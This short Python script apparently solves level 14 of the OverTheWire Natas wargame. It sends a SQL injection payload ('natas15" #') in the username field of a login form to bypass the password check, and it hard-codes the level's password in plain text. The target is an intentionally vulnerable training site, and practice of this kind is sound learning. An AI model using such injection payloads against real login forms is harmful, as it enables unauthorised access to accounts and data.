#!/usr/bin/env python3
import requests

url = 'http://natas14.natas.labs.overthewire.org/?debug=true'
username = 'natas14'
password ='Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

session = requests.Session()
# switch to single quotes to interrupt passing of the username value 
response = session.post(url, data = { "username": 'natas15" #', "password":"test" }, auth = (username, password))

pageContent = response.text

print(pageContent)